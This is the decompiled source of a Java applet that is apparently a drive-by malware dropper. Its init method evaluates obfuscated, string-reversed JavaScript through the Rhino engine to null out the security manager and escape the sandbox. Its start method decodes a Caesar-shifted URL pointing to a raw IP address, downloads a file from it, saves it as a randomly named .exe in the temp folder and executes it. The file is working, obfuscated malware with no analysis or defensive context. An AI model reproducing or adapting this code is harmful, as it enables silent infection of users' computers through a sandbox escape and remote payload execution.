import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Rhino extends Applet
{
    private JList misst;
    
    @Override
    public void init() {
        int i = 0;
        while (i < 10) {
            try {
                final String sdg = "oop".replace("oop", "js");
                final ScriptEngine art = new ScriptEngineManager().getEngineByName(sdg);
                final String sdytsdhsdh = ";sitjrtht = egassem.rortjrtre;};\"petjrty\" nrutjrtter;)(trtjrtats.tetjrtlppa;)llun(rtjrteganaMytirutjrtceStes.metsyStjrt.gnatjrtl.atjrtvaj {tjrt)(noitctjrtnuf = gtjrtnirtSot.stjrtiht;tjrt)\"rorrtjrte yM\"(rotjrtrrE wetjrtn =tjrt rortjrtre ratjrtv".replace("tjrt", "");
                final String sdhh = new StringBuffer(sdytsdhsdh).reverse().toString();
                art.eval(sdhh);
                final String essrs = "rortjrtre".replace("tjrt", "");
                final String reero = new StringBuffer(essrs).reverse().toString();
                this.add(this.misst = new JList((E[])new Object[] { art.get(reero) }));
                i = 10;
                return;
            }
            catch (Exception ex) {
                if (i != 9) {}
                ++i;
                continue;
            }
            break;
        }
    }
    
    @Override
    public void start() {
        try {
            final String teeh = "kwws=22<41454148619;2mordg1sks";
            String asq = "";
            for (int j = 0; j < teeh.length(); ++j) {
                int as = teeh.charAt(j);
                as -= 3;
                asq += (char)as;
            }
            final URL jejr = new URL(asq);
            jejr.openConnection();
            final InputStream sdhfduuer = jejr.openStream();
            asq = "jeeeaeeeveeea.eeeioeee.teeempdeeeir".replace("eee", "");
            String kkkdstrsd = System.getProperty(asq);
            if (kkkdstrsd.charAt(kkkdstrsd.length() - 1) != '\\') {
                kkkdstrsd += "\\";
            }
            final Random qwwwkkkdstrsd = new Random();
            final int randomInt = qwwwkkkdstrsd.nextInt(100);
            final String f44 = ".11e11x11e11".replace("11", "");
            final String strsd = kkkdstrsd + "dfjdk" + Integer.toString(randomInt) + f44;
            final int dddd = qwwwkkkdstrsd.nextInt(100);
            final FileOutputStream sryyw = new FileOutputStream(strsd);
            int uer = 0;
            final int randomwwInt = qwwwkkkdstrsd.nextInt(100);
            final byte[] sdhsryyw = new byte[8192];
            while ((uer = sdhfduuer.read(sdhsryyw, 0, sdhsryyw.length)) != -1) {
                sryyw.write(sdhsryyw, 0, uer);
            }
            final int randomrrrInt = qwwwkkkdstrsd.nextInt(100);
            final Runtime g322 = Runtime.getRuntime();
            sryyw.close();
            sdhfduuer.close();
            final Process ryydddd = g322.exec(strsd);
            try {
                ryydddd.waitFor();
                for (int i = 0; i < 9; ++i, ++i) {}
                final BufferedReader fduuer = new BufferedReader(new InputStreamReader(ryydddd.getInputStream()));
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
}
